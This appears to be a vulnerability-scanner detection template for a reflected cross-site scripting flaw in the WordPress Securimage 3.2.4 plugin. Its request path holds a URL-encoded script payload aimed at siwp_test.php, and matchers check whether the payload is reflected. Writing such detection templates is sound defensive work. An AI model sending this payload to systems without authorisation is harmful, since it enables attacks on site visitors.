id: wp-securimage-xss

info:
  name: WordPress Securimage 3.2.4 - Cross-Site Scripting
  author: daffainfo
  severity: medium
  description: WordPress Securimage 3.2.4 is vulnerable to reflected cross-site scripting via siwp_test.php.
  reference:
    - http://web.archive.org/web/20210123054214/https://www.securityfocus.com/bid/59816/info
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  tags: wordpress,xss,wp-plugin

requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200

